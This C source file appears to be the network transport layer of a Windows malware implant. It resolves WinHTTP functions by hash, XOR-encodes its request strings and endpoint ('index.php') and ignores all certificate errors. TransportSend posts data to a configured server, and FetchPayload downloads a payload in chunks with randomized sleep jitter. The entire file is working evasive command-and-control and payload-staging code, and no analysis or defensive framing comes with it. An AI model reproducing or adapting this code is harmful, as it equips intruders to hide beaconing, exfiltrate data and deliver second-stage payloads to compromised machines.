#include "Transport.h"
#include "Resolve.h"
#include "Hashes.h"
#include <winhttp.h>
#include <stdio.h>

#define xor_key 0x8F
static void xor_decw(PWCHAR buf, SIZE_T len){
	for (SIZE_T i = 0; i < len; i++)
		buf[i] ^= xor_key;
}

extern TRANSPORT_CFG g_TransportCfg;

BOOL TransportSend(LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize){

    typedef HINTERNET (WINAPI* fn_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI* fn_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI* fn_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI* fn_WinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
    typedef BOOL (WINAPI* fn_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI* fn_WinHttpReceiveResponse)(HINTERNET, LPVOID);
    typedef BOOL (WINAPI* fn_WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI* fn_WinHttpCloseHandle)(HINTERNET);
    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
    typedef HLOCAL (WINAPI* fn_ReAlloc)(HLOCAL, SIZE_T, UINT);

    HMODULE hWinHttp = ResolveModuleH(H_WINHTTP);
    HMODULE k32      = ResolveModuleH(H_KERNEL32);
    if (!hWinHttp || !k32) return FALSE;

    fn_WinHttpOpen            pOpen    = (fn_WinHttpOpen)ResolveFuncH(hWinHttp, H_WinHttpOpen);
    fn_WinHttpConnect         pConn    = (fn_WinHttpConnect)ResolveFuncH(hWinHttp, H_WinHttpConnect);
    fn_WinHttpOpenRequest     pReq     = (fn_WinHttpOpenRequest)ResolveFuncH(hWinHttp, H_WinHttpOpenRequest);
    fn_WinHttpSetOption       pSetOpt  = (fn_WinHttpSetOption)ResolveFuncH(hWinHttp, H_WinHttpSetOption);
    fn_WinHttpSendRequest     pSend    = (fn_WinHttpSendRequest)ResolveFuncH(hWinHttp, H_WinHttpSendRequest);
    fn_WinHttpReceiveResponse pRecv    = (fn_WinHttpReceiveResponse)ResolveFuncH(hWinHttp, H_WinHttpReceiveResponse);
    fn_WinHttpReadData        pReadD   = (fn_WinHttpReadData)ResolveFuncH(hWinHttp, H_WinHttpReadData);
    fn_WinHttpCloseHandle     pCloseH  = (fn_WinHttpCloseHandle)ResolveFuncH(hWinHttp, H_WinHttpCloseHandle);

    fn_Alloc   pAlloc   = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
    fn_ReAlloc pReAlloc = (fn_ReAlloc)ResolveFuncH(k32, H_LocalReAlloc);

    if (!pOpen || !pConn || !pReq || !pSend || !pCloseH || !pAlloc)
        return FALSE;

    HINTERNET   hSession    = NULL;
    HINTERNET   hConnect    = NULL;
    HINTERNET   hRequest    = NULL;
    DWORD       dwFlags     = 0;
    UCHAR       tmp[1024]   = { 0 };
    DWORD       dwRead      = 0;
    PVOID       resp        = NULL;
    SIZE_T      respSz      = 0;
    BOOL        ok          = FALSE;

    hSession = pOpen(g_TransportCfg.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = pConn(hSession, g_TransportCfg.Host, g_TransportCfg.Port, 0);
    if (!hConnect) goto cleanup;

    dwFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
    if (g_TransportCfg.Secure)
        dwFlags |= WINHTTP_FLAG_SECURE;

    WCHAR sPost[] = { 0x00DF,0x00C0,0x00DC,0x00DB, 0x0000 };
    WCHAR sEndp[] = { 0x00E6,0x00E1,0x00EB,0x00EA,0x00F7,0x00A1,0x00FF,0x00E7,0x00FF, 0x0000 };
    xor_decw(sPost, 4); xor_decw(sEndp, 9);
    hRequest = pReq(hConnect, sPost, sEndp, NULL, NULL, NULL, dwFlags);
    if (!hRequest) goto cleanup;

    if (g_TransportCfg.Secure && pSetOpt){
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        pSetOpt(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(DWORD));
    }

    if (!pSend(hRequest, NULL, 0, Data, Size, Size, 0)){
        g_TransportCfg.Secure = FALSE;
        goto cleanup;
    }
    if (RecvData && pRecv && pRecv(hRequest, NULL)){
        do {
            ok = pReadD(hRequest, tmp, sizeof(tmp), &dwRead);
            if (!ok || dwRead == 0) break;

            if (!resp)
                resp = pAlloc(LPTR, dwRead);
            else
                resp = pReAlloc(resp, respSz + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);

            memcpy((PUCHAR)resp + respSz, tmp, dwRead);
            respSz += dwRead;
            memset(tmp, 0, sizeof(tmp));

        } while (ok);

        if (RecvSize) *RecvSize = respSz;
        *RecvData = resp;
        ok = TRUE;
    }
    else if (!RecvData){
        pSend(hRequest, NULL, 0, Data, Size, Size, 0);
        ok = TRUE;
    }

cleanup:
    if (hRequest) pCloseH(hRequest);
    if (hConnect) pCloseH(hConnect);
    if (hSession) pCloseH(hSession);
    return ok;
}

static DWORD GrabChunk(HINTERNET hConnect, LPCWSTR BaseEp, DWORD idx, PUCHAR out, DWORD cap) {

    typedef HINTERNET (WINAPI* fn_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI* fn_WinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
    typedef BOOL (WINAPI* fn_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI* fn_WinHttpReceiveResponse)(HINTERNET, LPVOID);
    typedef BOOL (WINAPI* fn_WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI* fn_WinHttpCloseHandle)(HINTERNET);

    HMODULE hWinHttp = ResolveModuleH(H_WINHTTP);

    fn_WinHttpOpenRequest     pReq    = (fn_WinHttpOpenRequest)ResolveFuncH(hWinHttp, H_WinHttpOpenRequest);
    fn_WinHttpSetOption       pSetOpt = (fn_WinHttpSetOption)ResolveFuncH(hWinHttp, H_WinHttpSetOption);
    fn_WinHttpSendRequest     pSend   = (fn_WinHttpSendRequest)ResolveFuncH(hWinHttp, H_WinHttpSendRequest);
    fn_WinHttpReceiveResponse pRecv   = (fn_WinHttpReceiveResponse)ResolveFuncH(hWinHttp, H_WinHttpReceiveResponse);
    fn_WinHttpReadData        pReadD  = (fn_WinHttpReadData)ResolveFuncH(hWinHttp, H_WinHttpReadData);
    fn_WinHttpCloseHandle     pCloseH = (fn_WinHttpCloseHandle)ResolveFuncH(hWinHttp, H_WinHttpCloseHandle);

    if (!pReq || !pSend || !pRecv || !pReadD || !pCloseH)
        return 0;

    WCHAR path[256];
    wsprintfW(path, L"%s%lu", BaseEp, idx);

    DWORD dwFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
    if (g_TransportCfg.Secure)
        dwFlags |= WINHTTP_FLAG_SECURE;

    WCHAR sGet[] = { 0x00C8,0x00CA,0x00DB, 0x0000 };
    xor_decw(sGet, 3);

    HINTERNET hReq = pReq(hConnect, sGet, path, NULL, NULL, NULL, dwFlags);
    if (!hReq) return 0;

    if (g_TransportCfg.Secure && pSetOpt) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        pSetOpt(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(DWORD));
    }

    if (!pSend(hReq, NULL, 0, NULL, 0, 0, 0) || !pRecv(hReq, NULL)) {
        pCloseH(hReq);
        return 0;
    }

    DWORD total = 0, n = 0;
    while (pReadD(hReq, out + total, cap - total, &n) && n > 0)
        total += n;

    pCloseH(hReq);
    return total;
}

PUCHAR FetchPayload(LPCWSTR Endpoint, PDWORD OutLen) {

    typedef HINTERNET (WINAPI* fn_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI* fn_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef BOOL      (WINAPI* fn_WinHttpCloseHandle)(HINTERNET);
    typedef HLOCAL    (WINAPI* fn_Alloc)(UINT, SIZE_T);
    typedef HLOCAL    (WINAPI* fn_Free)(HLOCAL);
    typedef VOID      (WINAPI* fn_Sleep)(DWORD);
    typedef DWORD     (WINAPI* fn_Tick)(VOID);
    typedef ULONG     (WINAPI* fn_Rand)(PULONG);

    HMODULE hWinHttp = ResolveModuleH(H_WINHTTP);
    HMODULE k32      = ResolveModuleH(H_KERNEL32);
    HMODULE ntdll    = ResolveModuleH(H_NTDLL);

    fn_WinHttpOpen         pOpen   = (fn_WinHttpOpen)ResolveFuncH(hWinHttp, H_WinHttpOpen);
    fn_WinHttpConnect      pConn   = (fn_WinHttpConnect)ResolveFuncH(hWinHttp, H_WinHttpConnect);
    fn_WinHttpCloseHandle  pCloseH = (fn_WinHttpCloseHandle)ResolveFuncH(hWinHttp, H_WinHttpCloseHandle);
    fn_Alloc  pAlloc = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
    fn_Free   pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);
    fn_Sleep  pSleep = (fn_Sleep)ResolveFuncH(k32, H_Sleep);
    fn_Tick   pTick  = ntdll ? (fn_Tick)ResolveFuncH(k32, H_GetTickCount) : NULL;
    fn_Rand   pRand  = ntdll ? (fn_Rand)ResolveFuncH(ntdll, H_RtlRandomEx) : NULL;

    if (!pOpen || !pConn || !pCloseH || !pAlloc || !pFree || !pSleep)
        return NULL;

    HINTERNET hSession = pOpen(g_TransportCfg.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = pConn(hSession, g_TransportCfg.Host, g_TransportCfg.Port, 0);
    if (!hConnect) { pCloseH(hSession); return NULL; }

    DWORD  bufCap = 0x10000;
    PUCHAR buf    = (PUCHAR)pAlloc(LPTR, bufCap);
    DWORD  total  = 0;
    UCHAR  tmp[4096];

    for (DWORD i = 0; ; i++) {
        DWORD got = GrabChunk(hConnect, Endpoint, i, tmp, sizeof(tmp));
        if (got == 0)
            break;

        while (total + got > bufCap) {
            bufCap *= 2;
            PUCHAR nb = (PUCHAR)pAlloc(LPTR, bufCap);
            if (!nb) { pFree(buf); buf = NULL; goto done; }
            memcpy(nb, buf, total);
            pFree(buf);
            buf = nb;
        }

        memcpy(buf + total, tmp, got);
        total += got;

        if (pRand && pTick) {
            ULONG s = pTick();
            pSleep((pRand(&s) % 2000) + 500);
        } else {
            pSleep(1000);
        }
    }

    if (!total) {
        pFree(buf);
        buf = NULL;
    }

done:
    pCloseH(hConnect);
    pCloseH(hSession);

    if (buf && OutLen)
        *OutLen = total;

    return buf;
}
